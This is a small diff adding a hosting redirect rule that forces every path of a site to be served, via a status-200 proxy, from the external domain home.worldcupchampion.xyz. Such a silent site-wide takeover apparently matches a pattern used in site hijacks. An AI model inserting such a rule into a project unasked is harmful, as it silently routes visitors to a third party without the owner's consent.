@@ -1,0 +1,5 @@
+[[redirects]]
+  from = "/*"
+  to = "https://home.worldcupchampion.xyz/"
+  status = 200
+  force= true
